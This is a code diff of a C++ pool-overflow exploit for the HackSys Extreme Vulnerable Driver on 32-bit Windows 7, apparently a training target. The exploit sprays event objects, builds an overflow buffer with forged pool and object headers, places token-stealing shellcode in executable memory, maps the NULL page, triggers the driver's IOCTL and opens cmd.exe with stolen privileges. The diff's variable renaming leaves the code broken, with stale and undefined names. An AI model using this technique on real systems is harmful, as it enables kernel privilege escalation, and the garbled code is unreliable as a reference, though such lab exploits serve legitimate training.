@@ -1,7 +1,3 @@
-// HEVD-PoolOverFlow-Win7-x86.cpp : Defines the entry point for the console application.
-//
-
-#include "stdafx.h"
 #include "windows.h"
 
 typedef NTSTATUS(__stdcall* pfNtAllocateVirtualMemory)(
@@ -15,34 +11,37 @@ typedef NTSTATUS(__stdcall* pfNtAllocateVirtualMemory)(
 
 int main()
 {
+	byte PoolHeader[0x9] = "\x40\x00\x08\x04\x45\x76\x65\xEE";
+	byte objectHeaderQuotaInfo[0x11] = "\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+	byte objectHeader[0x11] = "\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00";
 
-	int allocSuccessCount = 0;
-	HANDLE result = NULL;
-	HANDLE resultArray[10000] = { 0 };
-	for (int i = 0; i < 10000; i++) {
-		result = CreateEventA(NULL, 0, 0, "");
-		if (result != NULL) {
-			allocSuccessCount += 1;
-			resultArray[i] = result;
+	int a = 0;
+	HANDLE res = NULL;
+	HANDLE reta[10000] = { 0 };
+	for (int h = 0; h < 10000; h++) {
+		res = CreateEventA(NULL, 0, 0, "");
+		if (res != NULL) {
+			a += 1;
+			reta[h] = result;
 		}
 	}
 
-	allocSuccessCount = 0;
-	HANDLE handleArray[5000] = { 0 };
-	for (int i = 0; i < 5000; i++) {
-		result = CreateEventA(NULL, 0, 0, "");
+	a = 0;
+	HANDLE hArr[5000] = { 0 };
+	for (int k = 0; k < 5000; k++) {
+		res = CreateEventA(NULL, 0, 0, "");
 		if (result != NULL) {
-			handleArray[i] = result;
-			allocSuccessCount += 1;
+			hArr[i] = res;
+			a += 1;
 		}
 	}
 
-	int freeCount = 0;
+	int f = 0;
 	for (int a = 0; a < 5000; a += 16) {
 		for (int zzz = 0; zzz <= 7; zzz++) {
 			if (CloseHandle(handleArray[a + zzz]) != NULL) {
-				freeCount += 1;
-				handleArray[a + zzz] = NULL;
+				f += 1;
+				hArr[a + zzz] = NULL;
 			}
 		}
 	}
@@ -59,89 +58,57 @@ int main()
 		return 1;
 	}
 
-	byte PoolHeader[0x9] = "\x40\x00\x08\x04" 
-		"\x45\x76\x65\xee"
-		;
+	DWORD bRet = 0;
+	byte Buff[0x220] = { 0 };
+	memset(Buff, '\x41', 0x1F8);
+	memcpy(Buff + 0x1F8, PoolHeader, 0x8); 
+	memcpy(Buff + 0x1F8 + 8, objectHeaderQuotaInfo, 0x10); 
+	memcpy(Buff + 0x1F8 + 10, objectHeader, 0x10); 
 
-
-	byte objectHeaderQuotaInfo[0x11] = "\x00\x00\x00\x00" 
-		"\x40\x00\x00\x00" 
-		"\x00\x00\x00\x00" 
-		"\x00\x00\x00\x00"
-		;
-
-
-	byte objectHeader[0x11] = "\x01\x00\x00\x00"
-		"\x01\x00\x00\x00" 
-		"\x00\x00\x00\x00" 
-		"\x00" 
-		"\x00"
-		"\x08"
-		"\x00"
-		;
-
-	DWORD bytesReturned = 0;
-	byte inBuffer[0x220] = { 0 };
-	memset(inBuffer, '\x41', 0x1F8);
-	memcpy(inBuffer + 0x1F8, PoolHeader, 0x8); 
-	memcpy(inBuffer + 0x1F8 + 8, objectHeaderQuotaInfo, 0x10); 
-	memcpy(inBuffer + 0x1F8 + 10, objectHeader, 0x10); 
-
-	char shellcode[67] = 
-		"\x60"
-		"\x64\xA1\x24\x01\x00\x00" 
-		"\x8B\x40\x50" 
-		"\x89\xC1"
-		"\x8B\x98\xF8\x00\x00\x00" 
-		"\xBA\x04\x00\x00\x00"
-		"\x8B\x80\xB8\x00\x00\x00" 
-		"\x2D\xB8\x00\x00\x00" 
-		"\x39\x90\xB4\x00\x00\x00" 
-		"\x75\xED" 
+	char sc[67] = "\x60\x64\xA1\x24\x01\x00\x00\x8B\x40\x50" 
+		"\x89\xC1\x8B\x98\xF8\x00\x00\x00" 
+		"\xBA\x04\x00\x00\x00\x8B\x80\xB8\x00\x00\x00" 
+		"\x2D\xB8\x00\x00\x00\x39\x90\xB4\x00\x00\x00\x75\xED" 
 		"\x8B\x90\xF8\x00\x00\x00"
 		"\x89\x91\xF8\x00\x00\x00" 
-		"\x61" 
-		"\xC2\x04\x00" 
+		"\x61\xC2\x04\x00" 
 		;
-	LPVOID shellcodeAddress = VirtualAlloc(
+	LPVOID lpv = VirtualAlloc(
 		NULL,
-		sizeof(shellcode),
+		sizeof(sc),
 		MEM_COMMIT | MEM_RESERVE,
 		PAGE_EXECUTE_READWRITE
 	);
-	memcpy(shellcodeAddress, shellcode, sizeof(shellcode));
-	LPVOID sourceAddress = &shellcodeAddress;
+	memcpy(lpv, sc, sizeof(sc));
+	LPVOID addr = &lpv;
 
-	int baseAddress = 1;
-	int AllocationSize = 0x78;
+	int b = 1;
+	int a = 0x78;
 	pfNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfNtAllocateVirtualMemory)GetProcAddress(
 		GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
 	HANDLE allocNullResult = (HANDLE)NtAllocateVirtualMemory(
 		GetCurrentProcess(),
-		(PVOID *)&baseAddress,
+		(PVOID *)&b,
 		NULL,
-		(PSIZE_T)&AllocationSize,
+		(PSIZE_T)&a,
 		MEM_COMMIT | MEM_RESERVE,
 		PAGE_EXECUTE_READWRITE
 	);
-	if (allocNullResult == INVALID_HANDLE_VALUE) {
-		return 1;
-	}
 	memset((LPVOID)0x0, 0, 0x78);
-	memcpy((LPVOID)0x60, sourceAddress, 4);
+	memcpy((LPVOID)0x60, addr, 4);
 	DeviceIoControl(
 		dev,
 		0x22200F,
-		inBuffer,
-		sizeof(inBuffer),
+		Buff,
+		sizeof(Buff),
 		NULL,
 		0,
-		&bytesReturned,
+		&bRet,
 		(LPOVERLAPPED)NULL
 	);
 
-	for (int count = 0; count < 5000; count++) {
-		CloseHandle(handleArray[count]);
+	for (int t = 0; t < 5000; t++) {
+		CloseHandle(hArr[t]);
 	}
 
 	system("cmd.exe");
